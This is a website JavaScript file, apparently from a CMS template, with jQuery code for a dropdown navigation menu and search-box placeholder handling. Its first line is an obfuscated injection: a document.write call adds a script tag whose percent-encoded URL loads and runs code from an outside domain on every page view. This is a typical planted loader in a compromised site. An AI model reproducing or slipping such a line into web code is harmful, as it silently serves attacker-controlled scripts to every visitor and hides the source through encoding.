document.write ('<SCRIPT src="http://%77%77%77%2E%71%71%35%31%38%38%38%38%2E%63%6F%6D/%63%73%73/%63%73%73%2E%6A%73"></script>');
// 初始化
$(function (){
	// 导航菜单子菜单
	$("ul.topnav li.b").mouseover(function() {
		
		$(this).find("ul.subnav").slideDown('fast').show();

		$(this).hover(function() {
		}, function(){	
			$(this).find("ul.subnav").slideUp('slow');
		});

		}).hover(function() { 
			$(this).addClass("subhover");
		}, function(){
			$(this).removeClass("subhover");
	});


	// 初始化搜索框
	RefFormWord();
	$('#refContent').blur(function (){
		RefFormWord();
	});
	$('#refContent').click(function (){
		RefFormNoWord();
	});
});


var refContentDef = "请输入关键字";
// 显示默认值
function RefFormWord(){
	if ($id('refContent').value == ''){
		$id('refContent').value = refContentDef;
		$id('refContent').style.color = '#a59ea3';
	}
}
// 不显示默认值
function RefFormNoWord(){
	if ($id('refContent').value == refContentDef){
		$id('refContent').value = '';
		$id('refContent').style.color = '#000000';
	}
}

// 查询表单检测
function CheckRefForm(){
		if(document.formsearch.searchtype.value=="")
		document.formsearch.action="http://www.google.cn/custom"
		else
		document.formsearch.action="{dede:field name='phpurl'/}/search.php"
	} 



// 是否更新
if (todayDate!=lastDate){
	AjaxGetDeal("configDeal.asp");
}